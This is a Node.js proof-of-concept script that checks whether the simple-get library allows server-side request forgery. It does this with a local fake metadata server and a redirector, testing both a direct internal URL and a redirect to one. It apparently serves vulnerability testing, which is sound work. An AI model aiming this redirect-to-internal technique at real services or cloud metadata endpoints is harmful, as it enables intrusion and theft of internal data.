// simple-get — SSRF PoC
// Spins up a target HTTP server that logs any request received, and calls
// it via simple-get using internal-network URLs. The package should not
// filter these — the test is whether it actually connects.
const http = require("http");
const simpleGet = require("simple-get");

const LISTEN_PORT = 4444;
const LOG_FILE = "/tmp/simple-get-ssrf.log";

// Start the target server (simulating an internal service like
// a cloud-metadata endpoint or admin panel). Listens on 127.0.0.1.
function startServer() {
  return new Promise((resolve) => {
    const srv = http.createServer((req, res) => {
      const entry = `${new Date().toISOString()} ${req.method} ${req.url} from ${req.socket.remoteAddress}\n`;
      require("fs").appendFileSync(LOG_FILE, entry);
      res.writeHead(200, { "Content-Type": "text/plain" });
      res.end("INTERNAL-METADATA-169.254.169.254: flag=secret-data\n");
    });
    srv.listen(LISTEN_PORT, "127.0.0.1", () => {
      console.log(`[+] target server listening on http://127.0.0.1:${LISTEN_PORT}`);
      resolve(srv);
    });
  });
}

function startRedirector() {
  // Listens on 4445 and responds to /goto with 302 -> internal URL
  return new Promise((resolve) => {
    const srv = http.createServer((req, res) => {
      const entry = `${new Date().toISOString()} ${req.method} ${req.url} from ${req.socket.remoteAddress}\n`;
      require("fs").appendFileSync(LOG_FILE, entry);
      res.writeHead(302, { Location: `http://127.0.0.1:${LISTEN_PORT}/metadata` });
      res.end();
    });
    srv.listen(4445, "127.0.0.1", () => {
      console.log(`[+] redirector listening on http://127.0.0.1:4445 (-> 127.0.0.1:4444)`);
      resolve(srv);
    });
  });
}

require("fs").writeFileSync(LOG_FILE, "");
let srv1, srv2;

(async () => {
  console.log("simple-get PoC — version:", require("simple-get/package.json").version);
  srv1 = await startServer();
  srv2 = await startRedirector();
  await new Promise((r) => setTimeout(r, 200));

  // ---- SG-01: Direct SSRF — no URL validation
  console.log("\n=== SG-01: SSRF via direct internal URL ===");
  await new Promise((resolve) => {
    simpleGet(
      { url: `http://127.0.0.1:${LISTEN_PORT}/internal-direct`, method: "GET" },
      (err, res) => {
        if (err) {
          console.log(`  SG-01 RESULT: blocked (${err.message})`);
          return resolve();
        }
        let body = "";
        res.on("data", (c) => (body += c));
        res.on("end", () => {
          console.log(`  SG-01 RESULT: status=${res.statusCode} body=${body.slice(0, 80)}`);
          console.log(`  >>> SG-01 CONFIRMED: simple-get reached internal 127.0.0.1 <<<`);
          resolve();
        });
      }
    );
  });

  // ---- SG-02: SSRF via redirect chain
  console.log("\n=== SG-02: SSRF via redirect to internal URL ===");
  await new Promise((resolve) => {
    simpleGet(
      { url: `http://127.0.0.1:4445/goto`, method: "GET" },
      (err, res) => {
        if (err) {
          console.log(`  SG-02 RESULT: blocked (${err.message})`);
          return resolve();
        }
        let body = "";
        res.on("data", (c) => (body += c));
        res.on("end", () => {
          console.log(`  SG-02 RESULT: status=${res.statusCode} body=${body.slice(0, 80)}`);
          if (body.includes("INTERNAL-METADATA")) {
            console.log(`  >>> SG-02 CONFIRMED: redirect followed to internal IP <<<`);
          }
          resolve();
        });
      }
    );
  });

  await new Promise((r) => setTimeout(r, 200));
  console.log("\n=== Request log (proof of outbound connections) ===");
  console.log(require("fs").readFileSync(LOG_FILE, "utf8"));

  srv1.close();
  srv2.close();
  process.exit(0);
})();
